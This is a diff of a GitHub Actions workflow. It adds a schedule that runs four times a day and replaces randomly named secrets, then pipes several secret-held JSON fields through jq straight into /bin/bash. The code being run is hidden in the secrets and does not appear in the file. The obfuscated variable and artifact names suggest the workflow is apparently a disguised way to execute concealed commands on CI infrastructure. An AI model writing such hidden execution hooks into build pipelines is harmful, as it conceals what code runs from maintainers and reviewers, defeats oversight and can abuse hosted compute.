@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '20 0,6,12,18 * * *'
 jobs:
   service:
     runs-on: ubuntu-latest
@@ -10,16 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run
         env:
-          ioav1: ${{ secrets.ioav1 }}
+          u60115: ${{ secrets.u60115 }}
         run: |
-          printf '%s' "$ioav1" | jq -r .xm57429 | /bin/bash
-          printf '%s' "$q4515" | jq -r .udj1490 | /bin/bash
-          printf '%s' "$bji6" | jq -r .r16 | /bin/bash
+          printf '%s' "$u60115" | jq -r .cav53 | /bin/bash
+          printf '%s' "$ioxg70" | jq -r .hkg6175 | /bin/bash
+          echo $zxmi816 | jq -r .hu93 | /bin/bash
+          printf '%s' "$aboar9" | jq -r .wmfi391 | /bin/bash
+          printf '%s' "$plffq66" | jq -r .j822 | /bin/bash
 
       - name: Save archive
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: iyUaeUu2
+          name: qxgO5imd
           path: "*.zip"
           retention-days: 1
